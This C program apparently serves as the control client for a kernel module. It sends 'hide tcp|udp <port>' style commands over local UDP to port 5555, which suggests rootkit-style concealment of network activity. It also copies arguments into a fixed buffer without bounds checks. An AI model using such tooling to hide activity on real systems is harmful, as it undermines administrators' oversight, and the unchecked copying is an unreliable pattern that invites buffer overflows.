
#include <stdio.h>
#include <arpa/inet.h>
#include <string.h>

#define BUFFSIZE 5096 

int main(int argc, char *argv[]) {
	int sendlen, receivelen;
	int received = 0;
	char buffer[BUFFSIZE];
	struct sockaddr_in receivesocket;
	struct sockaddr_in sendsocket;
	int sock;

	int ret = 0;
	
	if (argc < 4) {
		printf("no message specifyed.\nUsage: hide tcp|udp <port>\n");	
		return 0;
	}
	printf("command: %s\n", argv[1]);
	printf("type: %s\n", argv[2]);
	printf("which one: %s\n", argv[3]);

	/* Create the UDP socket */
	if ((sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
		perror("socket");
		return -1;
	}
	/* Now lets prepate two sockets. One to receive and one to send */

	/* To receive -> My address */
	memset(&receivesocket, 0, sizeof(receivesocket));
	receivesocket.sin_family = AF_INET;
	receivesocket.sin_addr.s_addr = htonl(INADDR_ANY);
	receivesocket.sin_port = htons(9999);

	receivelen = sizeof(receivesocket);
	if (bind(sock, (struct sockaddr *) &receivesocket, receivelen) < 0) {
		perror("Failed to bind to local address");
		return -1;
	}

	/* To send -> kernel address */
	memset(&sendsocket, 0, sizeof(sendsocket));
	sendsocket.sin_family = AF_INET;
	sendsocket.sin_addr.s_addr = inet_addr("127.0.0.1");
	sendsocket.sin_port = htons(5555);

	/* Send message to the server */
//	memcpy(buffer, "hello world", strlen("hello world") + 1);
	memcpy(buffer, argv[1], strlen(argv[1]));
	memcpy(buffer+strlen(argv[1]), argv[2], strlen(argv[2]));
	memcpy(buffer+strlen(argv[1])+strlen(argv[2]), argv[3], strlen(argv[3])+1);
	sendlen = strlen(buffer) + 1;

	printf("SendBuffer: %s\n",buffer);

	if (sendto(sock, buffer, sendlen, 0, (struct sockaddr *) &sendsocket, sizeof(sendsocket)) != sendlen) {
		perror("Sending the mesage failed");
		return -1;
	}
	printf("Done sending\n");
//	memset(buffer, 0, BUFFSIZE); // Prepare the buffer to receive the response
	/* Receive the response */
//	if ((received = recvfrom(sock, buffer, BUFFSIZE, 0, NULL, NULL)) < 0){
//		perror("recvfrom");
//		return -1;
//	}

//	printf("message received from the server: %s\n", buffer);

	return 0;
}
